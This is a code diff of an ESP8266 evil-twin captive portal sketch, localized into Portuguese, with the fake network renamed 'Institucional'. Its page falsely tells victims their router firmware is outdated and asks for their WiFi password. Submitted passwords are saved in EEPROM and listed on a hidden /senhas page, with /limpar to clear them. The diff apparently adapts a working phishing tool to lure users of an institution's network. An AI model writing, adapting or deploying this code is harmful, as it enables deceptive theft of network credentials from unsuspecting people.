@@ -1,5 +1,6 @@
 // ESP8266 WiFi Captive Portal
 // By 125K (github.com/125K)
+// modificado por Isaac Silva (github.com/isaacfloriano)
 
 // Libraries
 #include <ESP8266WiFi.h>
@@ -8,16 +9,16 @@
 #include <EEPROM.h>
 
 // Default SSID name
-const char* SSID_NAME = "Free WiFi";
+const char* SSID_NAME = "Institucional";
 
 // Default main strings
-#define SUBTITLE "Router info."
-#define TITLE "Update"
-#define BODY "Your router firmware is out of date. Update your firmware to continue browsing normally."
-#define POST_TITLE "Updating..."
-#define POST_BODY "Your router is being updated. Please, wait until the proccess finishes.</br>Thank you."
+#define SUBTITLE "Informação do roteador."
+#define TITLE "Atualizar"
+#define BODY "O firmware do seu roteador está desatualizado. Atualize seu firmware para continuar navegando normalmente."
+#define POST_TITLE "Atualizando..."
+#define POST_BODY "Seu roteador está sendo atualizado. Por favor, espere até que o processo termine.</br>Obrigado."
 #define PASS_TITLE "Passwords"
-#define CLEAR_TITLE "Cleared"
+#define CLEAR_TITLE "Liberado(a)"
 
 // Init system settings
 const byte HTTP_CODE = 200;
@@ -44,7 +45,7 @@ String input(String argName) {
   a.substring(0,200); return a; }
 
 String footer() { 
-  return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
+  return "</div><div class=q><a>&#169; Todos os direitos reservados.</a></div>";
 }
 
 String header(String t) {
@@ -67,7 +68,7 @@ String header(String t) {
   return h; }
 
 String index() {
-  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post><label>WiFi password:</label>"+
+  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post><label>Senha do wifi:</label>"+
     "<input type=password name=m></input><input type=submit value=Start></form>" + footer();
 }
 
@@ -89,11 +90,11 @@ String posted() {
 }
 
 String pass() {
-  return header(PASS_TITLE) + "<ol>" + allPass + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
+  return header(PASS_TITLE) + "<ol>" + allPass + "</ol><br><center><p><a style=\"color:blue\" href=/>Voltar ao início</a></p><p><a style=\"color:blue\" href=/clear>Limpar senhas</a></p></center>" + footer();
 }
 
 String ssid() {
-  return header("Change SSID") + "<p>Here you can change the SSID name. After pressing the button \"Change SSID\" you will lose the connection, so reconnect to the new SSID.</p>" + "<form action=/postSSID method=post><label>New SSID name:</label>"+
+  return header("Change SSID") + "<p>Aqui você pode alterar o nome SSID. Depois de pressionar o botão \"Change SSID\" você perderá a conexão, então reconecte-se ao novo SSID.</p>" + "<form action=/postSSID method=post><label>New SSID name:</label>"+
     "<input type=text name=s></input><input type=submit value=\"Change SSID\"></form>" + footer();
 }
 
@@ -112,7 +113,7 @@ String clear() {
   passEnd = passStart; // Setting the password end location -> starting position.
   EEPROM.write(passEnd, '\0');
   EEPROM.commit();
-  return header(CLEAR_TITLE) + "<div><p>The password list has been reseted.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
+  return header(CLEAR_TITLE) + "<div><p>A lista de senhas foi redefinida.</div></p><center><a style=\"color:blue\" href=/>Voltar ao início</a></center>" + footer();
 }
 
 void BLINK() { // The built-in LED will blink 5 times after a password is posted.
@@ -181,8 +182,8 @@ void setup() {
   webServer.on("/post",[]() { webServer.send(HTTP_CODE, "text/html", posted()); BLINK(); });
   webServer.on("/ssid",[]() { webServer.send(HTTP_CODE, "text/html", ssid()); });
   webServer.on("/postSSID",[]() { webServer.send(HTTP_CODE, "text/html", postedSSID()); });
-  webServer.on("/pass",[]() { webServer.send(HTTP_CODE, "text/html", pass()); });
-  webServer.on("/clear",[]() { webServer.send(HTTP_CODE, "text/html", clear()); });
+  webServer.on("/senhas",[]() { webServer.send(HTTP_CODE, "text/html", pass()); });
+  webServer.on("/limpar",[]() { webServer.send(HTTP_CODE, "text/html", clear()); });
   webServer.onNotFound([]() { lastActivity=millis(); webServer.send(HTTP_CODE, "text/html", index()); });
   webServer.begin();
 
